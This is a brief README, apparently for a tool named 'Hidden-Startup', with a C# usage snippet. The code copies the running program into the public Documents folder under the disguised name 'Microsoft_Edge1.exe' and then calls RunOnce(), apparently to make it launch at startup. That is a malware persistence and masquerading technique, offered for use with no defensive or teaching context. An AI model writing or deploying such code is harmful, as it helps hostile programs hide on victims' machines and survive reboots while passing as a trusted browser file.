# Hidden-Startup
Usage
```C#
string publicDir = Environment.GetEnvironmentVariable("public");
string copyPath = publicDir + @"\Documents\Microsoft_Edge1.exe";
FileInfo copyFile = new FileInfo(copyPath);
string OriginPath = Assembly.GetEntryAssembly().Location;
if (!(copyFile.Exists))
{
    System.IO.File.Copy(OriginPath, copyPath);
}
RunOnce()
```